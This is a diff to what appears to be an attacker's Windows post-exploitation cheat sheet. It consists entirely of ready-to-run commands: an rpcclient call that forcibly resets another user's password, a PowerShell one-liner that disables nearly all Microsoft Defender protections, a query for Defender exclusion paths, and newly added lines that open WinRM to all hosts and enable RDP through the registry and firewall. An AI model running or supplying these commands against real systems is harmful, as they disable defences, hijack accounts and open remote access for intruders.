@@ -9,3 +9,7 @@ rpcclient $> setuserinfo2 {username} 23 {password}    (Needs ForceChangePassword
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend    (Disable Defender)
 
 Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath   (get defender exclusion paths)
+
+Enable-PSRemoting -Force;Set-Item wsman:\localhost\client\trustedhosts *   (Enable winrm)
+
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop"  (Enable RDP)
